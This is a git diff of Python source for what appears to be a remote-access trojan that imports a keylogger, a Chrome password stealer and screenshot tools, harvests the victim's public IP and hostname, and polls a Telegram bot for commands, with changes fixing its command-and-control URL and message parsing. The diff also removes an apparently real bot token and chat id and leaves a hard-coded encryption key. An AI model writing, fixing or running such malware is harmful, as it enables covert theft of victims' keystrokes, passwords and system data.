@@ -1,4 +1,3 @@
-
 from cryptography.fernet import Fernet
 from pynput.keyboard import Listener
 import subprocess
@@ -9,7 +8,7 @@ import pyautogui
 import socket  
 import os 
 import sqlite3
-from os import listdir
+from os import curdir, listdir
 from os.path import isfile,join
 from Chrom_pass import Chrome_passwords
 from Crypt_my import Crypt_my101
@@ -33,8 +32,7 @@ key_crypt=b'64anpQ1F__rHalgTiLjqVNcf7TyirzwEqGJQM3fKAC8='
 telegram_token = 'Your telegram bot token'
 chat_id = 'chat id'
 
-telegram_token = '5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho'
-chat_id = '-791347020'
+
 keys=[]
 count=0
 
@@ -68,9 +66,8 @@ def send_files(path,type_file,name):
 def ip_information():
     r = requests.get(r'http://jsonip.com')
     public_ip= r.json()['ip']
-    hostname = socket.gethostname() 
-    IPAddr = socket.gethostbyname(hostname)   
-    ip_in=[public_ip,hostname,IPAddr]
+    hostname = socket.gethostname()    
+    ip_in=[public_ip,hostname]
     return ip_in
     
 
@@ -125,6 +122,8 @@ def advanced_ip_information():
         except Exception as e :
             print(e)
             pass
+    hostname = socket.gethostname()    
+    IPAddr = socket.gethostbyname(hostname)
     try:
         loc=r.json()['loc']
         loc=format(loc)
@@ -345,7 +344,7 @@ def capture_data():
 
 def read_messages():
     global offset,message_data
-    base_url='https://api.telegram.org/'+telegram_token+'/getUpdates?offset='+offset
+    base_url='https://api.telegram.org/bot'+telegram_token+'/getUpdates?offset='+offset
     resp = requests.get(base_url)
     messages=resp.text
     messages=messages.replace("update_id","^^^@^@").split('^^^')
@@ -372,7 +371,9 @@ def read_messages():
                 else:
                     break
             break
-    return [message_data[1:-1],offset]
+    if message_data[0] == '/':
+        return [message_data[1:-1],offset]
+    return [message_data,offset]
 
     
 
@@ -400,8 +401,6 @@ def time_cal(second,multiple):
 
 
 
-
-
 def wait_to_conect():
     global offset,ffo,cc
     ffo=0
@@ -415,12 +414,12 @@ def wait_to_conect():
             cc+=1
             ffo=off
             if cc>1:
+                print(command)
                 if 'connect '+conect_ip[0]+' '+conect_ip[1] in command:
                     ffo=0
                     cc=0
                     send_message('connected! '+conect_ip[0])
                     break
-                    
                 elif 'connected' in command:
                     send_message(conect_ip[0]+' '+conect_ip[1])
         time.sleep(3)
